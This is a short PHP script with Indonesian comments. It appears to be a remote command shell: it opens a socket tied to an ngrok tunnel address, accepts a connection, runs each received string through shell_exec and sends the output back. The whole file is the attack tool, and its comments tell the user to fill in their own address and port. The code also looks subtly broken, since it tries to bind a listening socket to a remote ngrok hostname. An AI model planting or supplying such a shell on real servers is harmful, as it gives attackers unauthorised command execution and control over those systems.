<?php
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '0.tcp.ap.ngrok.io';  // Ganti dengan alamat IP Anda
    $port = 19680;         // Ganti dengan port yang Anda inginkan

    $sock = socket_create(AF_INET, SOCK_STREAM, 0);
    socket_bind($sock, $ip, $port);
    socket_listen($sock);

    $client = socket_accept($sock);

    while (true) {
        // Menerima perintah dari client
        $command = socket_read($client, 1024);
        $output = shell_exec($command);

        // Mengirim output ke client
        socket_write($client, $output, strlen($output));
    }

    socket_close($client);
    socket_close($sock);
?>
